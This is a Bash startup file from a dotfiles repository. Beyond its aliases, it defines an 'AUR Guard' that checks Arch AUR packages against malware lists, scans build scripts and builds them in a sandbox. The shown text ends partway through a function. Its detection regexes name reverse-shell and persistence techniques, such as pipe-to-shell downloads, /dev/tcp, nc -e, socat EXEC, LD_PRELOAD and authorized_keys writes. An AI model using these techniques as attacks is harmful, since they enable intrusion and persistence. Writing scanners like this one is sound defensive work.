# shellcheck shell=bash
# github.com/dillacorn/awtarchy
# ~/.bashrc - User-specific Bash configuration

# Only run if shell is interactive
[[ $- != *i* ]] && return

# --- Aliases ---
# Colorize common commands for better visibility
alias ls='ls --color=auto'
alias grep='grep --color=auto'

# Flatpak alias to always use --user flag on non-Btrfs systems
alias flatpak='flatpak --user'

# Shortcut to launch Hyprland under Wayland session
alias hypr='XDG_SESSION_TYPE=wayland exec start-hyprland'

# --- Environment Variables ---
# Default editor for command line text editing
export EDITOR=/usr/bin/micro

# GTK theme for graphical apps
export GTK_THEME=Materia-dark

# --- Prompt ---
# PS1 defines the command prompt appearance
# \w = full current working directory path
# \$ = shows '#' for root, '$' for normal user
# Icon can be customized, examples: 󰞷 (penguin), , λ, etc.
PS1='󰞷 \w\$ '

# --- Functions ---

# Run a command in the background, redirecting output to a log file
background() {
  if [ $# -lt 1 ]; then
    echo "Usage: background <command> [args...]"
    return 1
  fi

  # Sanitize command name for log filename (replace '/' with '_')
  local cmd_name="${1//\//_}"

  # Run command detached from terminal, log output in ~/.cache/
  nohup "$@" > ~/.cache/"$cmd_name".log 2>&1 < /dev/null &

  echo "$1 started in background. Logs: ~/.cache/$cmd_name.log"
}

dryrun() {
    # Check if file exists and is readable
    if [[ ! -f "$1" || ! -r "$1" ]]; then
        echo -e "\033[1;31m✘ Error: '$1' is not a readable script file\033[0m" >&2
        return 1
    fi

    local script_name
    script_name=$(basename "$1")
    echo -e "\n\033[1;33m🏗️  DRY RUN: \033[1;37m${script_name}\033[0m"

    # Syntax & lint check using ShellCheck
    echo -e "\n\033[1;34m🔎 ShellCheck Analysis:\033[0m"
    if command -v shellcheck >/dev/null 2>&1; then
        if shellcheck "$1"; then
            echo -e "\033[1;32m✓ ShellCheck passed (no issues)\033[0m"
        else
            echo -e "\n\033[1;31m✘ ShellCheck found issues\033[0m" >&2
            return 1
        fi
    else
        echo -e "\033[1;31m✘ ShellCheck is not installed. Install it first:\033[0m"
        echo "  pacman -S shellcheck   # Arch"
        echo "  apt install shellcheck # Debian/Ubuntu"
        return 1
    fi

    # Command analysis with improved detection
    echo -e "\n\033[1;34m📊 Operations Analysis:\033[0m"

    declare -A categories=(
        ["🔧 System Modifications"]='sudo|install|ch(mod|own)|ufw|mount'
        ["📦 Package Management"]='yay|pacman|makepkg|flatpak|dnf|apt'
        ["🗂️  File Operations"]='rm\>|mv\>|cp\>|mkdir|ln\>'
        ["🔄 Git Operations"]='git\s+(clone|push|pull|reset|checkout)'
        ["🌐 Network Operations"]='curl\>|wget\>|ssh\>|scp\>'
    )

    local found_operations=false
    for category in "${!categories[@]}"; do
        local matches
        matches=$(grep -E --color=always -n "${categories[$category]}" "$1")
        if [[ -n "$matches" ]]; then
            found_operations=true
            echo -e "\n\033[1;35m${category}:\033[0m"
            echo "$matches" | while read -r line; do
                echo -e "  \033[1;36mLine ${line%%:*}\033[0m: ${line#*:}"
            done
        fi
    done

    if ! $found_operations; then
        echo -e "\033[1;37mNo potentially impactful operations found\033[0m"
    fi

    echo -e "\n\033[1;33m💡 Dry run complete. To execute:\033[0m\n\033[1;32m./${script_name}\033[0m"
}

# Remove older Awtarchy AUR Guard wrappers if this shell already loaded them.
unset -f yay paru 2>/dev/null

# --- AUR Guard ---
# Safe-by-default AUR workflow for interactive shells.
#
# Normal workflow:
#   sysupdate             update enabled pacman repository packages
#   aurcheck              list available AUR updates, emergency blocks, and historical warnings
#   aurverify package     recursively verify one AUR package and its AUR dependencies
#   aurup package         verify, prepare caches, offline-build/test, then install
#
# Every direct yay/paru invocation is blocked. Use aurunsafe only after manual review.

_AUR_GUARD_ARCH_LIST_URL='https://md.archlinux.org/s/SxbqukK6IA/download'
_AUR_GUARD_GITHUB_LIST_URL='https://raw.githubusercontent.com/lenucksi/aur-malware-check/master/package_list.txt'
_AUR_GUARD_CACHE_DIR="${XDG_CACHE_HOME:-$HOME/.cache}/awtarchy/aur-guard"
_AUR_GUARD_LIST_MAX_AGE=86400
_AUR_GUARD_LIST_MIN_NAMES=100

# Exact names that should remain permanently blocked even after historical
# incident records are cleaned or restored. Keep this list intentionally small.
_AUR_GUARD_EMERGENCY_BLOCK_PACKAGES=(
  vesktop-bin-patched
)

_AUR_GUARD_HARD_BLOCK_RE='atomic-lockfile|lockfile-js|js-digest|digest-js|src/hooks/deps|/api/agent|hidden_pids|hidden_names|hidden_inodes|curl[[:space:]][^|;]*\|[[:space:]]*(sh|bash)|wget[[:space:]][^|;]*\|[[:space:]]*(sh|bash)|base64[[:space:]]+(-d|--decode)|/dev/tcp|/dev/udp'
_AUR_GUARD_HOOK_BLOCK_RE='npm[[:space:]]+(install|i|add)|bun[[:space:]]+(install|add|i)|pnpm[[:space:]]+(install|add|i)|yarn[[:space:]]+(install|add)'
_AUR_GUARD_PACKAGE_JSON_BLOCK_RE='"(preinstall|postinstall)"[[:space:]]*:'
_AUR_GUARD_SOURCE_HARD_BLOCK_RE="${_AUR_GUARD_HARD_BLOCK_RE}|\$\([[:space:]]*(curl|wget)[^)]*\)|<\([[:space:]]*(curl|wget)[^)]*\)|(^|[;&|[:space:]])(nc|ncat)[[:space:]][^#]*[[:space:]]-e[[:space:]]|socat[[:space:]].*(EXEC|SYSTEM):|mkfifo[[:space:]].*(nc|ncat)|LD_PRELOAD=.*(/tmp|/dev/shm)|/etc/ld\.so\.preload|\.ssh/authorized_keys|\.config/autostart|systemd/user/|(^|[;&|[:space:]])crontab([[:space:]]|$)"
_AUR_GUARD_SOURCE_DOWNLOAD_RE='(^|[;&|[:space:]])(curl|wget|fetch|aria2c)[[:space:]]'
_AUR_GUARD_SOURCE_EXEC_RE='chmod[[:space:]][^#]*\+x|(^|[;&|[:space:]])(bash|sh|zsh|fish|python3?|perl|ruby|node)[[:space:]][^#]*(/tmp|/dev/shm)|(^|[;&|[:space:]])(eval|source)[[:space:]]|(^|[;&|[:space:]])\.[[:space:]]+[^[:space:]]|(^|[;&|[:space:]])(sudo|pkexec)[[:space:]]'
_AUR_GUARD_SOURCE_SCAN_MAX_BYTES=$((8 * 1024 * 1024))
_AUR_GUARD_SOURCE_SCAN_MAX_FILES=15000
_AUR_GUARD_SANDBOX_TIMEOUT_SECONDS=7200
_AUR_GUARD_SANDBOX_KILL_AFTER_SECONDS=15
_AUR_GUARD_SANDBOX_MEMORY_MAX='75%'
_AUR_GUARD_SANDBOX_MEMORY_SWAP_MAX='25%'
_AUR_GUARD_SANDBOX_TASKS_MAX=1024
_AUR_GUARD_SANDBOX_FILE_SIZE_MAX=$((16 * 1024 * 1024 * 1024))
_AUR_GUARD_ARTIFACT_MAX_BYTES=$((8 * 1024 * 1024 * 1024))
_AUR_GUARD_ARTIFACT_MAX_FILES=200000
_AUR_GUARD_TREE_MAX_BYTES=$((32 * 1024 * 1024 * 1024))
_AUR_GUARD_NETWORK_TEST_URL='https://aur.archlinux.org/'

_aur_guard_pass() {
  local msg="$1"
  printf '\n\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n'
  printf '\033[1;32mPASSED:\033[0m %s\n' "$msg"
  printf '\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n'
}

_aur_guard_fail() {
  local msg="$1"
  printf '\n\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n' >&2
  printf '\033[1;31mFAILED:\033[0m %s\n' "$msg" >&2
  printf '\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n' >&2
}

_aur_guard_refuse_install() {
  local pkg="$1"
  local reason="$2"

  printf '\n\033[1;31mAwtarchy refused to install: %s\033[0m\n' "$pkg" >&2
  printf 'Reason: %s\n' "$reason" >&2

  if [[ ${_AUR_GUARD_INSTALL_STARTED:-0} == 1 ]]; then
    printf 'The final pacman transaction started. Inspect /var/log/pacman.log before assuming the host is unchanged.\n' >&2
  else
    printf 'No package was installed.\n' >&2
  fi
}

_aur_guard_pick_helper() {
  local helper

  helper=$(type -P yay 2>/dev/null) && {
    printf '%s\n' "$helper"
    return 0
  }
  helper=$(type -P paru 2>/dev/null) && {
    printf '%s\n' "$helper"
    return 0
  }
  return 1
}

_aur_guard_validate_package_name() {
  local pkg="$1"

  if [[ ! "$pkg" =~ ^[[:alnum:]@_+][[:alnum:]@._+-]*$ ]]; then
    _aur_guard_fail "invalid package name: $pkg"
    return 1
  fi
}

_aur_guard_urlencode() {
  local value="$1"
  command jq -nr --arg value "$value" '$value | @uri'
}

_aur_guard_validate_official_remote() {
  local pkgbase="$1"
  local remote="$2"
  local expected="https://aur.archlinux.org/${pkgbase}.git"

  if [[ "$remote" != "$expected" ]]; then
    _aur_guard_fail "$pkgbase was fetched from an unexpected Git remote: $remote"
    printf 'Expected: %s\n' "$expected" >&2
    return 1
  fi
}

_aur_guard_download() {
  local url="$1"
  local output="$2"
  local output_dir output_name
  local -a command_line

  output_dir=$(dirname -- "$output") || return 1
  output_name=$(basename -- "$output") || return 1
  mkdir -p "$output_dir" || return 1

  case "$output_name" in
    ''|.|..|*/*)
      _aur_guard_fail "invalid download output path: $output"
      return 1
      ;;
  esac

  if type -P curl >/dev/null 2>&1; then
    command_line=(
      /usr/bin/curl
      --fail
      --silent
      --show-error
      --location
      --proto '=https'
      --tlsv1.2
      --connect-timeout 10
      --max-time 45
      --retry 2
      --output "/work/$output_name"
      "$url"
    )
  elif type -P wget >/dev/null 2>&1; then
    command_line=(
      /usr/bin/wget
      --https-only
      --timeout=45
      --tries=3
      --quiet
      --output-document="/work/$output_name"
      "$url"
    )
  else
    return 127
  fi

  _aur_guard_sandbox_exec "$output_dir" allow writable / "${command_line[@]}"
}

_aur_guard_cache_is_fresh() {
  local file="$1"
  local now mtime

  [[ -s "$file" ]] || return 1
  now=$(date +%s)
  mtime=$(stat -c %Y "$file" 2>/dev/null) || return 1
  (( now - mtime <= _AUR_GUARD_LIST_MAX_AGE ))
}

_aur_guard_normalize_list() {
  local input="$1"
  local output="$2"

  LC_ALL=C tr -cs 'a-z0-9@._+-' '\n' < "$input" \
    | grep -E '^[a-z0-9][a-z0-9@._+-]*$' \
    | LC_ALL=C sort -u > "$output"
}

_aur_guard_update_one_list() {
  local label="$1"
  local url="$2"
  local raw="$3"
  local names="$4"
  local tmp

  tmp=$(mktemp "${raw}.tmp.XXXXXX") || return 1

  if _aur_guard_download "$url" "$tmp" && [[ -s "$tmp" ]]; then
    mv -f "$tmp" "$raw"
    _aur_guard_normalize_list "$raw" "$names"
  else
    rm -f "$tmp"
    if _aur_guard_cache_is_fresh "$raw"; then
      printf 'AUR Guard: %s list download failed; using cache newer than 24 hours.\n' "$label" >&2
      [[ -s "$names" ]] || _aur_guard_normalize_list "$raw" "$names"
    else
      return 1
    fi
  fi

  [[ -s "$names" ]] || return 1

  local count
  count=$(wc -l < "$names")
  (( count >= _AUR_GUARD_LIST_MIN_NAMES ))
}

_aur_guard_refresh_blacklists() {
  local arch_raw arch_names github_raw github_names

  mkdir -p "$_AUR_GUARD_CACHE_DIR" || return 1

  arch_raw="$_AUR_GUARD_CACHE_DIR/arch-malware-list.raw"
  arch_names="$_AUR_GUARD_CACHE_DIR/arch-malware-list.names"
  github_raw="$_AUR_GUARD_CACHE_DIR/github-malware-list.raw"
  github_names="$_AUR_GUARD_CACHE_DIR/github-malware-list.names"

  if ! _aur_guard_update_one_list \
      'Arch' \
      "$_AUR_GUARD_ARCH_LIST_URL" \
      "$arch_raw" \
      "$arch_names"; then
    _aur_guard_fail 'could not download or use a fresh cached Arch malware package list'
    return 1
  fi

  if ! _aur_guard_update_one_list \
      'GitHub community' \
      "$_AUR_GUARD_GITHUB_LIST_URL" \
      "$github_raw" \
      "$github_names"; then
    _aur_guard_fail 'could not download or use a fresh cached GitHub malware package list'
    return 1
  fi
}

declare -A _AUR_GUARD_HISTORICAL_MATCHES=()
declare -A _AUR_GUARD_CONTEXT_WARNINGS=()

_aur_guard_historical_sources() {
  local pkg="$1"
  local found=false

  if /usr/bin/grep -Fxq -- "$pkg" "$_AUR_GUARD_CACHE_DIR/arch-malware-list.names"; then
    printf 'Arch maintained incident list\n'
    found=true
  fi

  if /usr/bin/grep -Fxq -- "$pkg" "$_AUR_GUARD_CACHE_DIR/github-malware-list.names"; then
    printf 'GitHub aur-malware-check list\n'
    found=true
  fi

  $found
}

_aur_guard_emergency_block_source() {
  local pkg="$1"
  local bad

  for bad in "${_AUR_GUARD_EMERGENCY_BLOCK_PACKAGES[@]}"; do
    if [[ "$pkg" == "$bad" ]]; then
      printf 'Awtarchy built-in emergency blocklist\n'
      return 0
    fi
  done

  return 1
}

_aur_guard_check_emergency_block() {
  local pkg="$1"
  local source

  source=$(_aur_guard_emergency_block_source "$pkg") || return 0

  printf '\n\033[1;31mHARD BLOCK MATCH:\033[0m %s\n' "$pkg" >&2
  printf '  - %s\n' "$source" >&2
  return 1
}

_aur_guard_note_historical_match() {
  local pkg="$1"
  local sources

  sources=$(_aur_guard_historical_sources "$pkg") || return 0

  if [[ ! ${_AUR_GUARD_HISTORICAL_MATCHES[$pkg]+set} ]]; then
    _AUR_GUARD_HISTORICAL_MATCHES["$pkg"]="$sources"

    printf '\n\033[1;33mHISTORICAL INCIDENT MATCH:\033[0m %s\n' "$pkg" >&2
    while IFS= read -r source; do
      [[ -n "$source" ]] && printf '  - %s\n' "$source" >&2
    done <<< "$sources"
    printf 'This name was previously reported as affected. That does not prove the current AUR revision is malicious.\n' >&2
    printf 'Awtarchy will continue with enhanced recursive and sandboxed verification.\n' >&2
  fi
}

_aur_guard_has_historical_matches() {
  (( ${#_AUR_GUARD_HISTORICAL_MATCHES[@]} > 0 ))
}

_aur_guard_print_historical_summary() {
  local pkg source

  _aur_guard_has_historical_matches || return 0

  printf '\n\033[1;33mHistorical incident matches in this AUR dependency tree:\033[0m\n' >&2
  while IFS= read -r pkg; do
    printf '  %s\n' "$pkg" >&2
    while IFS= read -r source; do
      [[ -n "$source" ]] && printf '    - %s\n' "$source" >&2
    done <<< "${_AUR_GUARD_HISTORICAL_MATCHES[$pkg]}"
  done < <(printf '%s\n' "${!_AUR_GUARD_HISTORICAL_MATCHES[@]}" | LC_ALL=C sort)
}

_aur_guard_note_context_warning() {
  local key="$1"
  local message="$2"

  if [[ -n ${_AUR_GUARD_CONTEXT_WARNINGS[$key]:-} ]]; then
    case $'\n'"${_AUR_GUARD_CONTEXT_WARNINGS[$key]}"$'\n' in
      *$'\n'"$message"$'\n'*) return 0 ;;
    esac
    _AUR_GUARD_CONTEXT_WARNINGS["$key"]+=$'\n'"$message"
  else
    _AUR_GUARD_CONTEXT_WARNINGS["$key"]="$message"
  fi

  printf '\n\033[1;33mCONTEXT WARNING:\033[0m %s\n' "$key" >&2
  printf '  %s\n' "$message" >&2
}

_aur_guard_has_context_warnings() {
  (( ${#_AUR_GUARD_CONTEXT_WARNINGS[@]} > 0 ))
}

_aur_guard_print_context_summary() {
  local key warning

  _aur_guard_has_context_warnings || return 0

  printf '\n\033[1;33mDependency and source-context warnings:\033[0m\n' >&2
  while IFS= read -r key; do
    printf '  %s\n' "$key" >&2
    while IFS= read -r warning; do
      [[ -n "$warning" ]] && printf '    - %s\n' "$warning" >&2
    done <<< "${_AUR_GUARD_CONTEXT_WARNINGS[$key]}"
  done < <(printf '%s\n' "${!_AUR_GUARD_CONTEXT_WARNINGS[@]}" | LC_ALL=C sort)
}

_aur_guard_has_guarded_matches() {
  _aur_guard_has_historical_matches || _aur_guard_has_context_warnings
}

_aur_guard_confirm_guarded_install() {
  local requested_pkg="$1"
  local answer

  _aur_guard_has_guarded_matches || return 0

  _aur_guard_print_historical_summary
  _aur_guard_print_context_summary
  printf '\nThe exact package revisions passed automated inspection, but the warnings above require manual acknowledgement.\n' >&2
  printf 'Type exactly INSTALL %s to continue: ' "$requested_pkg" >&2

  if ! IFS= read -r answer; then
    printf '\nCancelled. No package was installed.\n' >&2
    return 1
  fi

  if [[ "$answer" != "INSTALL $requested_pkg" ]]; then
    printf 'Cancelled. No package was installed.\n' >&2
    return 1
  fi
}

_aur_guard_has_unsafe_flag() {
  local arg

  for arg in "$@"; do
    case "$arg" in
      --noconfirm|--skipreview|--mflags|--mflags=*|--answerclean*|--answerdiff*|--answeredit*|--skippgpcheck|--skipchecksums|--skipinteg)
        return 0
        ;;
    esac
  done

  return 1
}

_aur_guard_is_mass_update() {
  local arg

  if [[ $# -eq 0 ]]; then
    return 0
  fi

  for arg in "$@"; do
    case "$arg" in
      -Syu|-Syyu|-Syuu|-Syyyu|-Sua|--sysupgrade)
        return 0
        ;;
    esac
  done

  return 1
}

_aur_guard_is_sync_install() {
  local arg

  for arg in "$@"; do
    case "$arg" in
      --sync|-S|-Sy|-Syy|-Syu|-Syyu|-Syuu|-Syyyu|-Sua)
        return 0
        ;;
    esac
  done

  return 1
}

_aur_guard_has_default_install_search() {
  local arg
  local has_mode=false

  for arg in "$@"; do
    case "$arg" in
      -Q*|-G|-P*|-S[silgpcw]*|--query|--getpkgbuild|--show-stats|--search|--info|--list|--groups|--print|--clean|--downloadonly|--help|--version)
        has_mode=true
        ;;
    esac
  done

  $has_mode && return 1
  return 0
}

_aur_guard_block_message() {
  local helper="$1"

  printf '\033[1;31mAUR Guard blocked this %s transaction.\033[0m\n\n' "$helper"
  printf 'Every direct helper operation is blocked by policy because it bypasses Awtarchy verification.\n\n'
  printf 'Use:\n'
  printf '  sysupdate             update enabled pacman repo packages\n'
  printf '  aurcheck              show AUR updates, emergency blocks, and historical warnings\n'
  printf '  aurverify package     recursively verify a package and all AUR dependencies\n'
  printf '  aurup package         verify, prepare caches, offline-build/test, then install\n\n'
  printf 'Unsafe manual override:\n'
  printf '  aurunsafe %s [arguments]\n' "$helper"
}

_aur_guard_dependency_name() {
  local dep="$1"
  dep="${dep%%[<>=]*}"
  dep="${dep//[[:space:]]/}"
  printf '%s\n' "$dep"
}

_aur_guard_repo_package_satisfies() {
  local dep_spec="$1"
  local dep_name="$2"
  local candidate_version constraint operator required comparison

  candidate_version=$(command pacman -Si "$dep_name" 2>/dev/null \
    | awk -F ': ' '/^Version/ {print $2; exit}')
  [[ -n "$candidate_version" ]] || return 1

  constraint="${dep_spec#"$dep_name"}"
  [[ -n "$constraint" ]] || return 0

  case "$constraint" in
    '>='*) operator='>='; required="${constraint#>=}" ;;
    '<='*) operator='<='; required="${constraint#<=}" ;;
    '>'*)  operator='>';  required="${constraint#>}" ;;
    '<'*)  operator='<';  required="${constraint#<}" ;;
    '='*)  operator='=';  required="${constraint#=}" ;;
    *) return 1 ;;
  esac

  [[ -n "$required" ]] || return 1
  comparison=$(vercmp "$candidate_version" "$required") || return 1

  case "$operator" in
    '>=') (( comparison >= 0 )) ;;
    '<=') (( comparison <= 0 )) ;;
    '>')  (( comparison > 0 )) ;;
    '<')  (( comparison < 0 )) ;;
    '=')  (( comparison == 0 )) ;;
  esac
}

_aur_guard_find_installed_provider() {
  local dep_name="$1"
  local desc

  for desc in /var/lib/pacman/local/*/desc; do
    [[ -r "$desc" ]] || continue
    awk -v wanted="$dep_name" '
      $0 == "%NAME%" {
        getline
        name = $0
        if (name == wanted) {
          print name
          exit
        }
        next
      }
      $0 == "%PROVIDES%" {
        in_provides = 1
        next
      }
      in_provides && $0 == "" {
        in_provides = 0
        next
      }
      in_provides {
        provided = $0
        sub(/[<>=].*$/, "", provided)
        if (provided == wanted) {
          print name
          exit
        }
      }
    ' "$desc"
  done | LC_ALL=C sort -u | head -n 1
}

_aur_guard_rpc_exact_package() {
  local pkg="$1"
  local json encoded

  _aur_guard_validate_package_name "$pkg" || return 1
  encoded=$(_aur_guard_urlencode "$pkg") || return 1
  json=$(mktemp) || return 1

  if ! _aur_guard_download \
      "https://aur.archlinux.org/rpc/v5/info?arg%5B%5D=${encoded}" \
      "$json"; then
    rm -f "$json"
    return 1
  fi

  command jq -r --arg pkg "$pkg" '
    .results[]
    | select(.Name == $pkg)
    | .Name
  ' "$json"

  local status=$?
  rm -f "$json"
  return "$status"
}

_aur_guard_rpc_providers() {
  local dep_name="$1"
  local json encoded

  type -P jq >/dev/null 2>&1 || return 2
  _aur_guard_validate_package_name "$dep_name" || return 1
  encoded=$(_aur_guard_urlencode "$dep_name") || return 1
  json=$(mktemp) || return 1

  if ! _aur_guard_download \
      "https://aur.archlinux.org/rpc/v5/search/${encoded}?by=provides" \
      "$json"; then
    rm -f "$json"
    return 1
  fi

  command jq -r --arg dep "$dep_name" '
    .results[]
    | select(
        .Name == $dep
        or ((.Provides // [])
          | map(sub("[<>=].*$"; ""))
          | index($dep))
      )
    | .Name
  ' "$json" | LC_ALL=C sort -u

  local status=${PIPESTATUS[0]}
  rm -f "$json"
  return "$status"
}

_aur_guard_rpc_package_base() {
  local pkg="$1"
  local json encoded

  _aur_guard_validate_package_name "$pkg" || return 1
  encoded=$(_aur_guard_urlencode "$pkg") || return 1
  json=$(mktemp) || return 1

  if ! _aur_guard_download \
      "https://aur.archlinux.org/rpc/v5/info?arg%5B%5D=${encoded}" \
      "$json"; then
    rm -f "$json"
    return 1
  fi

  command jq -r --arg pkg "$pkg" '
    .results[]
    | select(.Name == $pkg)
    | (.PackageBase // .Name)
  ' "$json"

  local status=$?
  rm -f "$json"
  return "$status"
}

_aur_guard_prepare_public_keyring() {
  local pkgdir="$1"
  local gnupg_dir="$pkgdir/.awtarchy-gnupg"
  local exported_keys="$pkgdir/.awtarchy-public-keys.gpg"

  rm -rf "$gnupg_dir"
  install -d -m 0700 "$gnupg_dir" || return 1

  if command gpg --batch --export > "$exported_keys" 2>/dev/null \
      && [[ -s "$exported_keys" ]]; then
    if ! GNUPGHOME="$gnupg_dir" command gpg --batch --quiet \
        --import "$exported_keys" >/dev/null 2>&1; then
      rm -f "$exported_keys"
      _aur_guard_fail 'could not create an isolated public-key ring for source verification'
      return 1
    fi
  fi

  rm -f "$exported_keys"
}

_aur_guard_add_ro_path() {
  local array_name="$1"
  local source="$2"
  local destination="$3"
  local -n array_ref="$array_name"

  [[ -e "$source" || -L "$source" ]] || return 0

  if [[ -L "$source" ]]; then
    array_ref+=(--symlink "$(readlink -- "$source")" "$destination")
  elif [[ -d "$source" ]]; then
    array_ref+=(--ro-bind "$source" "$destination")
  else
    array_ref+=(--ro-bind "$source" "$destination")
  fi
}

_aur_guard_run_sandbox_command() {
  local network="$1"
  shift
  local -a systemd_args command_line

  systemd_args=(
    /usr/bin/systemd-run
    --user
    --wait
    --pipe
    --collect
    --quiet
    --property=Type=exec
    --property="MemoryMax=$_AUR_GUARD_SANDBOX_MEMORY_MAX"
    --property="MemorySwapMax=$_AUR_GUARD_SANDBOX_MEMORY_SWAP_MAX"
    --property="TasksMax=$_AUR_GUARD_SANDBOX_TASKS_MAX"
    --property="LimitFSIZE=$_AUR_GUARD_SANDBOX_FILE_SIZE_MAX"
    --property=NoNewPrivileges=yes
  )

  case "$network" in
    allow)
      systemd_args+=(
        --property='IPAddressDeny=localhost link-local multicast 0.0.0.0/8 10.0.0.0/8 100.64.0.0/10 127.0.0.0/8 169.254.0.0/16 172.16.0.0/12 192.168.0.0/16 224.0.0.0/4 240.0.0.0/4 ::1/128 ::ffff:0:0/96 fc00::/7 fe80::/10 ff00::/8'
      )
      command_line=(
        /usr/bin/pasta
        --quiet
        --foreground
        --config-net
        --no-map-gw
        --map-host-loopback none
        --map-guest-addr none
        --no-splice
        --tcp-ports none
        --udp-ports none
        --
        "$@"
      )
      ;;
    deny)
      command_line=("$@")
      ;;
    *)
      _aur_guard_fail "invalid sandbox network mode: $network"
      return 2
      ;;
  esac

  command timeout \
    --foreground \
    --kill-after="${_AUR_GUARD_SANDBOX_KILL_AFTER_SECONDS}s" \
    "${_AUR_GUARD_SANDBOX_TIMEOUT_SECONDS}s" \
    "${systemd_args[@]}" "${command_line[@]}"
}

_aur_guard_sandbox_exec() {
  local workdir="$1"
  local network="$2"
  local access="$3"
  local rootfs="$4"
  local username uid gid sandbox_meta resolv_file passwd_file group_file path status
  local -a bwrap_args

  shift 4
  username="${USER:-$(id -un)}"
  uid=$(id -u) || return 1
  gid=$(id -g) || return 1
  rootfs="${rootfs%/}"
  [[ -n "$rootfs" ]] || rootfs='/'

  [[ -d "$workdir" ]] || {
    _aur_guard_fail "sandbox work directory does not exist: $workdir"
    return 1
  }
  [[ -d "$rootfs/usr" ]] || {
    _aur_guard_fail "sandbox root does not contain /usr: $rootfs"
    return 1
  }

  sandbox_meta=$(mktemp -d "${TMPDIR:-/tmp}/awtarchy-sandbox.XXXXXX") || return 1
  resolv_file="$sandbox_meta/resolv.conf"
  passwd_file="$sandbox_meta/passwd"
  group_file="$sandbox_meta/group"

  printf '%s\n' \
    'nameserver 9.9.9.9' \
    'nameserver 149.112.112.112' \
    'options timeout:2 attempts:2' \
    > "$resolv_file" || {
    rm -rf "$sandbox_meta"
    return 1
  }
  printf 'root:x:0:0:root:/root:/bin/bash\n%s:x:%s:%s:AUR Guard:/tmp/awtarchy-home:/bin/bash\n' \
    "$username" "$uid" "$gid" > "$passwd_file"
  printf 'root:x:0:\n%s:x:%s:\n' "$username" "$gid" > "$group_file"
  chmod 0644 "$resolv_file" "$passwd_file" "$group_file"

  bwrap_args=(
    --die-with-parent
    --new-session
    --unshare-user
    --unshare-ipc
    --unshare-pid
    --unshare-uts
    --unshare-cgroup-try
    --disable-userns
    --cap-drop ALL
    --hostname awtarchy-aur-guard
    --proc /proc
    --dev /dev
    --tmpfs /tmp
    --tmpfs /dev/shm
    --tmpfs /run
    --dir /etc
    --dir /var
    --dir /var/lib
    --dir /var/cache
    --dir /opt
    --dir /home
    --dir /root
    --dir /mnt
    --dir /media
    --dir /srv
    --ro-bind "$rootfs/usr" /usr
  )

  case "$network" in
    allow)
      ;;
    deny)
      bwrap_args+=(--unshare-net)
      ;;
    *)
      rm -rf "$sandbox_meta"
      _aur_guard_fail "invalid sandbox network mode: $network"
      return 2
      ;;
  esac

  for path in bin sbin lib lib64; do
    _aur_guard_add_ro_path bwrap_args "$rootfs/$path" "/$path"
  done

  for path in \
      makepkg.conf makepkg.conf.d pacman.conf pacman.d paru.conf yay.conf \
      nsswitch.conf hosts host.conf ssl ca-certificates localtime locale.conf \
      locale.gen ld.so.cache ld.so.conf ld.so.conf.d gitconfig; do
    _aur_guard_add_ro_path bwrap_args "$rootfs/etc/$path" "/etc/$path"
  done

  _aur_guard_add_ro_path bwrap_args "$rootfs/var/lib/pacman" /var/lib/pacman
  _aur_guard_add_ro_path bwrap_args "$rootfs/var/cache/pacman/pkg" /var/cache/pacman/pkg
  _aur_guard_add_ro_path bwrap_args "$rootfs/opt" /opt

  bwrap_args+=(
    --ro-bind "$resolv_file" /etc/resolv.conf
    --ro-bind "$passwd_file" /etc/passwd
    --ro-bind "$group_file" /etc/group
  )

  case "$access" in
    readonly)
      bwrap_args+=(--ro-bind "$workdir" /work)
      ;;
    writable)
      bwrap_args+=(--bind "$workdir" /work)
      if [[ -d "$workdir/.git" ]]; then
        bwrap_args+=(--ro-bind "$workdir/.git" /work/.git)
      fi
      ;;
    *)
      rm -rf "$sandbox_meta"
      _aur_guard_fail "invalid sandbox filesystem mode: $access"
      return 2
      ;;
  esac

  bwrap_args+=(
    --dir /tmp/awtarchy-home
    --clearenv
    --setenv HOME /tmp/awtarchy-home
    --setenv USER "$username"
    --setenv LOGNAME "$username"
    --setenv SHELL /bin/bash
    --setenv PATH /usr/local/sbin:/usr/local/bin:/usr/bin
    --setenv LANG C.UTF-8
    --setenv LC_ALL C.UTF-8
    --setenv TMPDIR /tmp
    --setenv GNUPGHOME /work/.awtarchy-gnupg
    --setenv XDG_CACHE_HOME /work/.awtarchy-cache
    --setenv CARGO_HOME /work/.awtarchy-cache/cargo
    --setenv GOCACHE /work/.awtarchy-cache/go-build
    --setenv GOMODCACHE /work/.awtarchy-cache/go-mod
    --setenv npm_config_cache /work/.awtarchy-cache/npm
    --setenv BUN_INSTALL_CACHE_DIR /work/.awtarchy-cache/bun
    --setenv YARN_CACHE_FOLDER /work/.awtarchy-cache/yarn
    --setenv CCACHE_DIR /work/.awtarchy-cache/ccache
    --setenv SRCDEST /work
    --setenv BUILDDIR /work/.awtarchy-build
    --setenv PKGDEST /work/.awtarchy-pkg
    --setenv SRCPKGDEST /work/.awtarchy-srcpkg
    --setenv LOGDEST /work/.awtarchy-log
    --chdir /work
    "$@"
  )

  _aur_guard_run_sandbox_command "$network" /usr/bin/bwrap "${bwrap_args[@]}"
  status=$?
  rm -rf "$sandbox_meta"
  return "$status"
}

_aur_guard_makepkg_sandbox() {
  local pkgdir="$1"
  local network="$2"
  local access="$3"
  local rootfs="${_AUR_GUARD_SANDBOX_ROOTFS:-/}"

  shift 3

  mkdir -p \
    "$pkgdir/.awtarchy-gnupg" \
    "$pkgdir/.awtarchy-build" \
    "$pkgdir/.awtarchy-pkg" \
    "$pkgdir/.awtarchy-srcpkg" \
    "$pkgdir/.awtarchy-log" \
    "$pkgdir/.awtarchy-cache" || return 1

  _aur_guard_sandbox_exec \
    "$pkgdir" "$network" "$access" "$rootfs" \
    /usr/bin/makepkg "$@"
}

_aur_guard_assert_tracked_files_unchanged() {
  local pkg="$1"
  local pkgdir="$2"

  if ! command git -C "$pkgdir" diff --quiet -- . \
      || ! command git -C "$pkgdir" diff --cached --quiet -- .; then
    command git -C "$pkgdir" diff -- . >&2 || true
    _aur_guard_fail "$pkg modified tracked AUR files while makepkg metadata or sources were being inspected"
    return 1
  fi
}

_aur_guard_source_candidate() {
  local file="$1"
  local relative="$2"
  local name="${relative##*/}"

  case "$name" in
